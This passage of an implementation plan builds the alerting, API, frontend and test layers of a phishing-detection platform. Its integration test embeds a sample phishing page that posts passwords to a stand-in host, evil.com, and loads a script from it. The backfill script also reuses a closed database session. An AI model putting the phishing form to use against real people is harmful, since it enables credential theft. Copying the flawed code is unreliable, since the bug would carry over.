Create `vigilwolf-core/backend/test_alert_service.py`:

```python
"""Test alert service: webhook delivery, dedup, HMAC signing."""
import pytest
import json
import hmac
import hashlib
from services.alert_service import AlertService, build_webhook_payload, sign_payload


def test_build_payload_structure():
    payload = build_webhook_payload(
        event="phishing_detected",
        domain="paypa1-secure.com",
        score=87,
        risk_level="high",
        severity="critical",
        dominant_signals=["login_form", "brand_match"],
        snapshot_id="snap1",
        reasons=[{"plugin": "login_detector", "reason": "login_form_detected", "confidence": 0.95}],
    )
    assert payload["id"].startswith("evt_")
    assert payload["version"] == "1.0"
    assert payload["event"] == "phishing_detected"
    assert payload["dedup_key"] == "phishing_detected:snap1"
    assert payload["data"]["domain"] == "paypa1-secure.com"
    assert payload["data"]["score"] == 87


def test_sign_payload():
    body = b'{"event":"test"}'
    secret = "my_secret_key"
    signature = sign_payload(body, secret)
    expected = hmac.new(secret.encode(), body, hashlib.sha256).hexdigest()
    assert signature == f"sha256={expected}"


def test_dedup_key_format():
    payload = build_webhook_payload(
        event="phishing_detected", domain="x.com", score=50,
        risk_level="medium", severity="medium", dominant_signals=[],
        snapshot_id="snap2", reasons=[],
    )
    assert payload["dedup_key"] == "phishing_detected:snap2"
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd vigilwolf-core/backend
pytest test_alert_service.py -v
```

- [ ] **Step 3: Implement alert_service.py**

Create `vigilwolf-core/backend/services/alert_service.py`:

```python
"""Webhook alert delivery service for VigilWolf v2."""
import hmac
import hashlib
import json
import uuid
import time
import random
import logging
from datetime import datetime, timezone
from typing import Optional

import requests
from plugins.base import SnapshotContext
import config

logger = logging.getLogger(__name__)

DEDUP_WINDOW_SECONDS = 600  # 10 minutes


def build_webhook_payload(
    event: str,
    domain: str,
    score: int,
    risk_level: str,
    severity: str,
    dominant_signals: list[str],
    snapshot_id: str,
    reasons: list[dict],
    iocs: list[dict] | None = None,
    campaign_id: str | None = None,
) -> dict:
    """Build canonical webhook payload."""
    return {
        "id": f"evt_{uuid.uuid4().hex[:12]}",
        "version": "1.0",
        "event": event,
        "dedup_key": f"{event}:{snapshot_id}",
        "timestamp": datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
        "data": {
            "domain": domain,
            "score": score,
            "risk_level": risk_level,
            "severity": severity,
            "dominant_signals": dominant_signals,
            "reasons": reasons,
            "iocs": iocs or [],
            "snapshot_id": snapshot_id,
            "campaign": campaign_id,
            "screenshot_url": f"/api/v2/snapshots/{snapshot_id}/screenshot",
        },
    }


def sign_payload(body: bytes, secret: str) -> str:
    """Generate HMAC-SHA256 signature for webhook payload."""
    signature = hmac.new(secret.encode(), body, hashlib.sha256).hexdigest()
    return f"sha256={signature}"


class AlertService:
    """Manages webhook delivery with dedup, retry, and fan-out isolation."""

    def send_alert(self, ctx: SnapshotContext, score_outcome: dict):
        """Send alert to all matching webhooks."""
        from database import get_session, WebhookModel, AlertModel, RiskScoreModel
        from sqlalchemy import select

        event = "phishing_detected"
        if score_outcome.get("hard_signal"):
            event = "phishing_detected"

        payload = build_webhook_payload(
            event=event,
            domain=ctx.domain,
            score=score_outcome["score"],
            risk_level=score_outcome["risk_level"],
            severity=score_outcome["severity"],
            dominant_signals=score_outcome.get("dominant_signals", []),
            snapshot_id=ctx.snapshot_id,
            reasons=score_outcome.get("reasons", []),
        )

        with get_session() as session:
            webhooks = session.execute(
                select(WebhookModel).where(WebhookModel.enabled == True)
            ).scalars().all()

            for webhook in webhooks:
                # Check if this event is in webhook's subscriptions
                if event not in (webhook.events or []):
                    continue

                # Check dedup window
                dedup_key = payload["dedup_key"]
                existing = session.execute(
                    select(AlertModel).where(
                        AlertModel.dedup_key == dedup_key,
                        AlertModel.webhook_id == webhook.id,
                    )
                ).scalar_one_or_none()
                if existing and (datetime.now(timezone.utc) - existing.created_at.replace(tzinfo=timezone.utc)).total_seconds() < DEDUP_WINDOW_SECONDS:
                    logger.info(f"Dedup: skipping alert {dedup_key} for webhook {webhook.id}")
                    continue

                # Deliver (each webhook independently)
                self._deliver_webhook(webhook, payload, ctx, score_outcome, session)

    def _deliver_webhook(self, webhook, payload, ctx, score_outcome, session):
        """Deliver a single webhook with retry + jitter."""
        from database import AlertModel

        body = json.dumps(payload).encode("utf-8")
        headers = {"Content-Type": "application/json"}
        if webhook.secret:
            headers["X-VigilWolf-Signature"] = sign_payload(body, webhook.secret)

        alert = AlertModel(
            event_type=payload["event"],
            dedup_key=payload["dedup_key"],
            domain_id=ctx.snapshot_record.get("domain_id"),
            snapshot_id=ctx.snapshot_id,
            risk_level=score_outcome["risk_level"],
            severity=score_outcome["severity"],
            score=score_outcome["score"],
            webhook_id=webhook.id,
            payload=payload,
            payload_version=payload["version"],
            status="sent",
        )

        for attempt in range(3):
            try:
                resp = requests.post(
                    webhook.url,
                    data=body,
                    headers=headers,
                    timeout=30,
                )
                if 200 <= resp.status_code < 300:
                    alert.status = "sent"
                    alert.attempts = attempt + 1
                    alert.last_attempt_at = datetime.now(timezone.utc)
                    session.add(alert)
                    session.commit()
                    logger.info(f"Webhook delivered to {webhook.name}: {resp.status_code}")
                    return
                elif resp.status_code >= 500:
                    # Retry with jitter
                    delay = (2 ** attempt) + random.uniform(0, 1)
                    time.sleep(delay)
                    continue
                else:
                    # Client error, don't retry
                    alert.status = "failed"
                    alert.attempts = attempt + 1
                    alert.error_message = f"HTTP {resp.status_code}"
                    session.add(alert)
                    session.commit()
                    return
            except (requests.Timeout, requests.ConnectionError):
                delay = (2 ** attempt) + random.uniform(0, 1)
                time.sleep(delay)
                continue
            except Exception as e:
                logger.error(f"Webhook delivery error: {e}")
                break

        alert.status = "failed"
        alert.attempts = 3
        alert.last_attempt_at = datetime.now(timezone.utc)
        session.add(alert)
        session.commit()
```

- [ ] **Step 4: Run tests**

```bash
cd vigilwolf-core/backend
pytest test_alert_service.py -v
```

Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add vigilwolf-core/backend/services/alert_service.py vigilwolf-core/backend/test_alert_service.py
git commit -m "feat: add alert service — webhook delivery with HMAC signing, dedup, retry+ jitter"
```

---

## Task 9: v2 API Endpoints

**Files:**
- Create: `vigilwolf-core/backend/routes/__init__.py`
- Create: `vigilwolf-core/backend/routes/v2/__init__.py`
- Create: `vigilwolf-core/backend/routes/v2/domains.py`
- Create: `vigilwolf-core/backend/routes/v2/webhooks.py`
- Create: `vigilwolf-core/backend/routes/v2/alerts.py`
- Create: `vigilwolf-core/backend/routes/v2/search.py`
- Create: `vigilwolf-core/backend/routes/v2/plugins.py`
- Create: `vigilwolf-core/backend/routes/v2/monitoring.py`
- Modify: `vigilwolf-core/backend/main.py` — mount v2 router

This task creates the v2 API routes. Each file defines FastAPI routers that are mounted at `/api/v2/` in main.py. The implementation follows the endpoint spec in Section 9 of the design spec.

Due to the volume of endpoints, I'll outline the key structure per file with the critical endpoints. Each file follows the same pattern: Pydantic request/response models, router with dependencies for auth, CRUD operations via database sessions.

- [ ] **Step 1: Create routes/v2/domains.py** — Domain list (cursor-paginated), domain detail, domain threat view, threat feed, threat stats

```python
# Key endpoints:
# GET  /api/v2/domains          — list with filters (risk, brand, cursor pagination)
# GET  /api/v2/domains/{id}     — detail with risk_score
# GET  /api/v2/domains/{id}/threat — threat view with score breakdown + IOCs
# GET  /api/v2/threats          — threat feed (high/medium risk domains)
# GET  /api/v2/threats/stats    — counts: total, high, medium, low, active_campaigns
```

- [ ] **Step 2: Create routes/v2/webhooks.py** — Webhook CRUD + test

```python
# POST  /api/v2/webhooks        — create webhook
# GET   /api/v2/webhooks        — list webhooks
# GET   /api/v2/webhooks/{id}   — get webhook
# PUT   /api/v2/webhooks/{id}   — update webhook
# DELETE /api/v2/webhooks/{id}  — delete webhook
# POST  /api/v2/webhooks/{id}/test — send test payload
```

- [ ] **Step 3: Create routes/v2/alerts.py** — Alert history + retry

```python
# GET  /api/v2/alerts           — list alerts (cursor-paginated, filterable)
# GET  /api/v2/alerts/{id}      — alert detail
# POST /api/v2/alerts/{id}/retry — retry failed alert
```

- [ ] **Step 4: Create routes/v2/search.py** — Global search + pivot

```python
# GET  /api/v2/search?q=...     — global search (ranked, typed results)
# GET  /api/v2/pivot/domain/{id} — pivot from domain to related entities
```

- [ ] **Step 5: Create routes/v2/plugins.py** — Plugin management

```python
# GET  /api/v2/plugins           — list registered plugins
# PUT  /api/v2/plugins/{name}/weight — update weight
# PUT  /api/v2/plugins/{name}/enabled — enable/disable
# GET  /api/v2/plugins/{name}/impact  — preview weight change
# GET  /api/v2/risk-thresholds   — get/set risk thresholds
```

- [ ] **Step 6: Create routes/v2/monitoring.py** — v2 monitoring endpoints (same as v1 but under /api/v2/)

- [ ] **Step 7: Mount v2 router in main.py**

Add to `vigilwolf-core/backend/main.py` after existing routes:

```python
from routes.v2 import domains, webhooks, alerts, search, plugins, monitoring

v2_router = APIRouter(prefix="/api/v2")
v2_router.include_router(domains.router)
v2_router.include_router(webhooks.router)
v2_router.include_router(alerts.router)
v2_router.include_router(search.router)
v2_router.include_router(plugins.router)
v2_router.include_router(monitoring.router)

app.include_router(v2_router, dependencies=[Depends(verify_api_key)])
```

- [ ] **Step 8: Test v2 endpoints**

```bash
cd vigilwolf-core/backend
pytest test_api_endpoints.py -v -k "v2"
```

- [ ] **Step 9: Commit**

```bash
git add vigilwolf-core/backend/routes/ vigilwolf-core/backend/main.py
git commit -m "feat: add v2 API endpoints — domains, threats, webhooks, alerts, search, plugins"
```

---

## Task 10: Frontend — Sidebar Layout + TanStack Query + Zustand

**Files:**
- Modify: `vigilwolf-core/frontend/app/layout.tsx`
- Create: `vigilwolf-core/frontend/components/layout/sidebar.tsx`
- Create: `vigilwolf-core/frontend/components/layout/header.tsx`
- Create: `vigilwolf-core/frontend/lib/query-client.tsx`
- Create: `vigilwolf-core/frontend/lib/store.ts`
- Create: `vigilwolf-core/frontend/lib/api-v2.ts`
- Modify: `vigilwolf-core/frontend/package.json`

- [ ] **Step 1: Install new frontend dependencies**

```bash
cd vigilwolf-core/frontend
npm install @tanstack/react-query zustand
```

- [ ] **Step 2: Create lib/query-client.tsx** — TanStack Query provider

- [ ] **Step 3: Create lib/store.ts** — Zustand store for UI state (sidebar open/close, active filters, search query)

- [ ] **Step 4: Create lib/api-v2.ts** — v2 API client with all endpoint constants and helper functions using TanStack Query

- [ ] **Step 5: Create components/layout/sidebar.tsx** — Sidebar with links to Dashboard, NRD, Monitor, Threats, Alerts, Settings. Phase 2+ links (Clusters, Campaigns, Actors) disabled/hidden.

- [ ] **Step 6: Create components/layout/header.tsx** — Top bar with global search input and VigilWolf branding

- [ ] **Step 7: Update app/layout.tsx** — Replace navbar with sidebar + header layout. Wrap in QueryClientProvider.

- [ ] **Step 8: Test frontend builds and renders**

```bash
cd vigilwolf-core/frontend
npm run build
```

Expected: successful build

- [ ] **Step 9: Commit**

```bash
git add vigilwolf-core/frontend/
git commit -m "feat: add sidebar layout, TanStack Query, Zustand, v2 API client"
```

---

## Task 11: Frontend — Threat Feed Page

**Files:**
- Create: `vigilwolf-core/frontend/app/threats/page.tsx`
- Create: `vigilwolf-core/frontend/app/threats/[id]/page.tsx`
- Create: `vigilwolf-core/frontend/components/threats/threat-table.tsx`
- Create: `vigilwolf-core/frontend/components/threats/threat-score-badge.tsx`
- Create: `vigilwolf-core/frontend/components/threats/score-breakdown.tsx`
- Create: `vigilwolf-core/frontend/components/threats/ioc-list.tsx`
- Create: `vigilwolf-core/frontend/components/shared/risk-badge.tsx`
- Create: `vigilwolf-core/frontend/components/shared/severity-badge.tsx`
- Create: `vigilwolf-core/frontend/components/shared/score-bar.tsx`

This task builds the primary analyst view — the threat feed and threat detail pages as described in Section 8 of the design spec.

- [ ] **Step 1: Create shared components** — risk-badge, severity-badge, score-bar

- [ ] **Step 2: Create threat-score-badge.tsx** — Color-coded score display (red/orange/green)

- [ ] **Step 3: Create threat-table.tsx** — Server-paginated, filterable table of threats. Columns: Risk badge, Domain, Score, Signals, First Seen. Inline pivot actions: [View] [Pivot → Campaign] [Pivot → IOC].

- [ ] **Step 4: Create threats/page.tsx** — Threat feed page with filters (risk level, brand, score range, date range). Uses TanStack Query to fetch `/api/v2/threats`.

- [ ] **Step 5: Create score-breakdown.tsx** — Per-plugin score breakdown with confidence display

- [ ] **Step 6: Create ioc-list.tsx** — Extracted IOCs with type icons and copy buttons

- [ ] **Step 7: Create threats/[id]/page.tsx** — Full threat detail: score breakdown, reasons, IOCs, snapshot timeline, screenshot viewer

- [ ] **Step 8: Test by running dev server and verifying pages render**

```bash
cd vigilwolf-core/frontend
npm run dev
# Visit http://localhost:3000/threats
```

- [ ] **Step 9: Commit**

```bash
git add vigilwolf-core/frontend/app/threats/ vigilwolf-core/frontend/components/threats/ \
  vigilwolf-core/frontend/components/shared/
git commit -m "feat: add threat feed page, threat detail, score breakdown, IOC display"
```

---

## Task 12: Frontend — Alerts Page + Webhook Management

**Files:**
- Create: `vigilwolf-core/frontend/app/alerts/page.tsx`
- Create: `vigilwolf-core/frontend/components/alerts/webhook-card.tsx`
- Create: `vigilwolf-core/frontend/components/alerts/webhook-form.tsx`
- Create: `vigilwolf-core/frontend/components/alerts/alert-history.tsx`

- [ ] **Step 1: Create webhook-card.tsx** — Display webhook config with name, URL, events, filters, enabled toggle, test button

- [ ] **Step 2: Create webhook-form.tsx** — Form to add/edit webhooks: name, URL, secret, events (multi-select), filters (min_score, domains, exclude_tags)

- [ ] **Step 3: Create alert-history.tsx** — Alert list with severity badge, domain, status (sent/failed/retrying), timestamp. Retry button for failed alerts. Dedup grouping.

- [ ] **Step 4: Create alerts/page.tsx** — Two sections: webhook management (top) + alert history (bottom). Add webhook button opens webhook-form in a dialog.

- [ ] **Step 5: Test by visiting /alerts in dev server**

- [ ] **Step 6: Commit**

```bash
git add vigilwolf-core/frontend/app/alerts/ vigilwolf-core/frontend/components/alerts/
git commit -m "feat: add alerts page with webhook management and alert history"
```

---

## Task 13: Frontend — Enhanced Settings + Global Search

**Files:**
- Modify: `vigilwolf-core/frontend/app/settings/page.tsx`
- Create: `vigilwolf-core/frontend/components/shared/global-search.tsx`

- [ ] **Step 1: Add plugin management section to settings** — List plugins with name, type, enabled toggle, weight slider. Show impact preview when weight changes. Warning when weight change would reduce HIGH detections by >30%.

- [ ] **Step 2: Add risk threshold configuration** — Adjustable HIGH/MEDIUM thresholds with visual bar showing score distribution.

- [ ] **Step 3: Create global-search.tsx** — Search input in header that queries `/api/v2/search?q=...`. Displays results grouped by type (domain, IOC, campaign) with relevance scores. Clicking navigates to the entity page.

- [ ] **Step 4: Add global search to header.tsx**

- [ ] **Step 5: Test all new pages in dev server**

- [ ] **Step 6: Commit**

```bash
git add vigilwolf-core/frontend/app/settings/ vigilwolf-core/frontend/components/shared/global-search.tsx \
  vigilwolf-core/frontend/components/layout/header.tsx
git commit -m "feat: add enhanced settings with plugin management, global search"
```

---

## Task 14: Frontend — Dashboard Redesign

**Files:**
- Modify: `vigilwolf-core/frontend/app/page.tsx`
- Create: `vigilwolf-core/frontend/app/nrd/page.tsx` (move NRD content from home)

- [ ] **Step 1: Create /nrd page** — Move existing NRD dashboard content from home page to /nrd

- [ ] **Step 2: Redesign home page as threat dashboard** — Stats cards (total domains, HIGH count, MEDIUM count, LOW count), recent high-risk threats table, active campaigns summary, alert summary (24h)

- [ ] **Step 3: Test home page and /nrd both work**

- [ ] **Step 4: Commit**

```bash
git add vigilwolf-core/frontend/app/page.tsx vigilwolf-core/frontend/app/nrd/
git commit -m "feat: redesign dashboard as threat overview, move NRD to /nrd"
```

---

## Task 15: Docker Worker Service + Pipeline Integration Test

**Files:**
- Modify: `vigilwolf-core/docker-compose.yml` (add worker service)
- Create: `vigilwolf-core/backend/test_pipeline_integration.py`

- [ ] **Step 1: Add Dramatiq worker service to docker-compose.yml**

```yaml
  worker:
    build:
      context: ./backend
      dockerfile: Dockerfile
    container_name: vigilwolf-worker
    command: dramatiq vigilwolf.worker
    environment:
      - DATABASE_URL=postgresql://vigilwolf:${POSTGRES_PASSWORD:-changeme}@postgres:5432/vigilwolf
      - REDIS_URL=redis://redis:6379/0
      - DRAMATIQ_BROKER_URL=redis://redis:6379/0
      - USE_DRAMATIQ_PIPELINE=true
      - ENABLED_PLUGINS=login_detector,keyword_detector,brand_match,external_js_detector,nrd_age_scorer,html_hasher
      - ALERTS_ENABLED=true
      - ALERTS_DRY_RUN=true
      - API_KEY=change-me-in-production
    depends_on:
      - postgres
      - redis
    volumes:
      - backend-data:/app/monitoring_data
    restart: unless-stopped
```

- [ ] **Step 2: Write integration test**

Create `vigilwolf-core/backend/test_pipeline_integration.py`:

```python
"""Integration test: full pipeline from HTML capture to risk scoring."""
import pytest
from worker import build_snapshot_context, orchestrate_analysis, build_snapshot_context
from plugins.base import SnapshotContext


def test_full_pipeline_phishing_domain():
    """A known phishing page should score HIGH with correct signals."""
    html = '''
    <html><head><title>PayPa1 Securiity</title></head>
    <body>
    <form action="https://evil.com/steal" method="POST">
      <input type="password" name="pass">
      <input type="hidden" name="token" value="x">
      <input type="submit" value="Verify">
    </form>
    <p>Your account will be suspended. Verify immediately. OTP required.</p>
    <script src="https://evil.com/malware.js"></script>
    </body></html>
    '''

    ctx = build_snapshot_context(
        snapshot_id="snap_phish",
        domain="paypa1-secure-login.com",
        html=html,
        snapshot_record={"id": "snap_phish", "domain_id": "d1", "first_seen": "2026-04-26T00:00:00Z"},
    )

    # Run all plugins
    from plugins.registry import PLUGIN_REGISTRY
    from plugins.base import PluginType

    results = []
    for group in __import__("plugins.registry", fromlist=["get_execution_groups"]).get_execution_groups():
        for plugin_name, _ in group.plugins:
            cls = PLUGIN_REGISTRY.get(plugin_name)
            if cls:
                result = cls().run(ctx)
                results.append(result)

    # Score
    from services.scoring_service import calculate_score
    weights = {"login_detector": 1.0, "keyword_detector": 0.6, "brand_match": 1.2,
               "external_js_detector": 0.8, "nrd_age_scorer": 0.5}
    outcome = calculate_score(results, weights)

    assert outcome["risk_level"] == "high"
    assert outcome["severity"] == "critical"  # hard signal: credential_exfil
    assert outcome["score"] >= 70


def test_full_pipeline_benign_domain():
    """A benign page should score LOW."""
    html = '''
    <html><head><title>Welcome to Bob's Cat Blog</title></head>
    <body>
    <p>Welcome to my blog about cats and dogs. I love animals.</p>
    <script src="/app.js"></script>
    </body></html>
    '''

    ctx = build_snapshot_context(
        snapshot_id="snap_safe",
        domain="bobscats.com",
        html=html,
        snapshot_record={"id": "snap_safe", "domain_id": "d2", "first_seen": "2024-01-01T00:00:00Z"},
    )

    from plugins.registry import PLUGIN_REGISTRY
    results = []
    for group in __import__("plugins.registry", fromlist=["get_execution_groups"]).get_execution_groups():
        for plugin_name, _ in group.plugins:
            cls = PLUGIN_REGISTRY.get(plugin_name)
            if cls:
                result = cls().run(ctx)
                results.append(result)

    from services.scoring_service import calculate_score
    weights = {"login_detector": 1.0, "keyword_detector": 0.6, "brand_match": 1.2,
               "external_js_detector": 0.8, "nrd_age_scorer": 0.5}
    outcome = calculate_score(results, weights)

    assert outcome["risk_level"] == "low"
    assert outcome["score"] < 40
```

- [ ] **Step 3: Run integration test**

```bash
cd vigilwolf-core/backend
pytest test_pipeline_integration.py -v
```

Expected: PASS — phishing domain scores HIGH/critical, benign domain scores LOW.

- [ ] **Step 4: Full Docker stack test**

```bash
cd vigilwolf-core
docker compose up -d
docker compose exec backend curl -s http://localhost:8000/health
docker compose exec worker ps aux | grep dramatiq
```

Expected: health returns OK, worker process running.

- [ ] **Step 5: Commit**

```bash
git add vigilwolf-core/docker-compose.yml vigilwolf-core/backend/test_pipeline_integration.py
git commit -m "feat: add Dramatiq worker service, pipeline integration tests"
```

---

## Task 16: Seed Plugin Weights + Prometheus Pipeline Metrics

**Files:**
- Create: `vigilwolf-core/backend/seed_weights.py`
- Modify: `vigilwolf-core/backend/main.py` (add pipeline metrics)
- Modify: `vigilwolf-core/backend/worker.py` (add Prometheus timing)

- [ ] **Step 1: Create seed_weights.py** — Inserts default plugin weights into PostgreSQL on first run

```python
"""Seed default plugin weights into the database."""
from database import get_session, PluginWeightModel

DEFAULT_WEIGHTS = {
    "login_detector": 1.0,
    "keyword_detector": 0.6,
    "brand_match": 1.2,
    "external_js_detector": 0.8,
    "nrd_age_scorer": 0.5,
    "html_hasher": 1.0,
    "ioc_extractor": 1.0,
}


def seed_weights():
    with get_session() as session:
        for name, weight in DEFAULT_WEIGHTS.items():
            existing = session.get(PluginWeightModel, name)
            if not existing:
                session.add(PluginWeightModel(plugin_name=name, weight=weight))
        session.commit()
```

- [ ] **Step 2: Add pipeline Prometheus metrics** — `vigilwolf_pipeline_domains_processed_total`, `vigilwolf_pipeline_processing_duration_seconds` (per plugin), `vigilwolf_pipeline_queue_depth`

- [ ] **Step 3: Call seed_weights() in FastAPI lifespan**

- [ ] **Step 4: Test metrics endpoint returns pipeline data**

```bash
curl -s http://localhost:8000/metrics | grep vigilwolf_pipeline
```

- [ ] **Step 5: Commit**

```bash
git add vigilwolf-core/backend/seed_weights.py vigilwolf-core/backend/main.py vigilwolf-core/backend/worker.py
git commit -m "feat: add plugin weight seeding, pipeline Prometheus metrics"
```

---

## Task 17: Backfill Existing Data + Final Validation

**Files:**
- Create: `vigilwolf-core/backend/backfill.py`

- [ ] **Step 1: Create backfill.py** — Enqueue existing snapshots through the analysis pipeline to generate risk scores for historical data

```python
"""Backfill risk scores for existing snapshots."""
from database import get_session, SnapshotModel, DomainModel
from worker import build_context_and_analyze
from plugins.storage_manager import get_storage_manager
import logging

logger = logging.getLogger(__name__)


def backfill_snapshots(dry_run: bool = True):
    """Process all existing snapshots through the analysis pipeline."""
    storage = get_storage_manager()

    with get_session() as session:
        snapshots = session.execute(
            __import__("sqlalchemy").select(SnapshotModel)
        ).scalars().all()

    logger.info(f"Backfill: {len(snapshots)} snapshots to process")

    processed = 0
    for snapshot in snapshots:
        if not snapshot.success or not snapshot.html_path:
            continue

        try:
            html = storage.load_html(snapshot.html_path)
            domain = session.get(DomainModel, snapshot.domain_id)
            if not domain:
                continue

            if dry_run:
                logger.info(f"[DRY RUN] Would process snapshot {snapshot.id}")
            else:
                build_context_and_analyze(
                    snapshot.id, snapshot.domain_id, domain.url, html,
                    {"id": snapshot.id, "domain_id": snapshot.domain_id,
                     "first_seen": str(domain.created_at)},
                )
                logger.info(f"Processed snapshot {snapshot.id}")

            processed += 1
        except Exception as e:
            logger.error(f"Backfill failed for snapshot {snapshot.id}: {e}")

    logger.info(f"Backfill complete: {processed}/{len(snapshots)} processed")
```

- [ ] **Step 2: Run backfill in dry-run mode**

```bash
cd vigilwolf-core/backend
python -c "from backfill import backfill_snapshots; backfill_snapshots(dry_run=True)"
```

- [ ] **Step 3: Verify no data loss by comparing pre/post domain counts**

```bash
docker compose exec postgres psql -U vigilwolf -c "SELECT COUNT(*) FROM domains;"
docker compose exec postgres psql -U vigilwolf -c "SELECT COUNT(*) FROM snapshots;"
```

- [ ] **Step 4: Commit**

```bash
git add vigilwolf-core/backend/backfill.py
git commit -m "feat: add backfill script for existing snapshot risk scoring"
```

---

## Task 18: Update Frontend API Proxy Allowlist

**Files:**
- Modify: `vigilwolf-core/frontend/app/api/proxy/[...path]/route.ts`

- [ ] **Step 1: Add v2 API path patterns to the proxy allowlist**

Add these regex patterns to the existing allowlist in `route.ts`:

```typescript
// v2 API routes
/^\/api\/v2\/domains/,
/^\/api\/v2\/threats/,
/^\/api\/v2\/webhooks/,
/^\/api\/v2\/alerts/,
/^\/api\/v2\/search/,
/^\/api\/v2\/pivot/,
/^\/api\/v2\/plugins/,
/^\/api\/v2\/risk-thresholds/,
/^\/api\/v2\/monitoring/,
/^\/api\/v2\/nrd/,
/^\/api\/v2\/brand/,
/^\/api\/v2\/snapshots/,
/^\/api\/v2\/health/,
/^\/api\/v2\/config/,
/^\/api\/v2\/metrics/,
/^\/api\/v2\/queue/,
/^\/api\/v2\/audit-logs/,
```

- [ ] **Step 2: Test proxy forwards v2 requests correctly**

```bash
curl -s http://localhost:3000/api/proxy/api/v2/health
```

Expected: returns health check JSON from backend.

- [ ] **Step 3: Commit**

```bash
git add vigilwolf-core/frontend/app/api/proxy/[...path]/route.ts
git commit -m "feat: add v2 API paths to frontend proxy allowlist"
```

---

## Summary of Tasks

| Task | Component | Depends On |
|---|---|---|
| 1 | Infrastructure (PostgreSQL + Alembic + Dramatiq + config) | — |
| 2 | Database schema (all v2 ORM models + migration) | 1 |
| 3 | Data migration (SQLite → PostgreSQL with validation) | 2 |
| 4 | Plugin framework (base classes + registry) | 1 |
| 5 | Phase 1 plugins (5 detectors + html_hasher) | 4 |
| 6 | Scoring service | 5 |
| 7 | Dramatiq worker pipeline | 5, 6 |
| 8 | Alert service (webhook delivery) | 6 |
| 9 | v2 API endpoints | 2, 6, 8 |
| 10 | Frontend sidebar + state management | 1 |
| 11 | Frontend threat feed page | 9, 10 |
| 12 | Frontend alerts page | 9, 10 |
| 13 | Frontend settings + global search | 9, 10 |
| 14 | Frontend dashboard redesign | 10 |
| 15 | Docker worker + pipeline integration test | 7, 9 |
| 16 | Plugin weights seed + metrics | 15 |
| 17 | Backfill existing data | 15 |
| 18 | Frontend proxy allowlist update | 9 |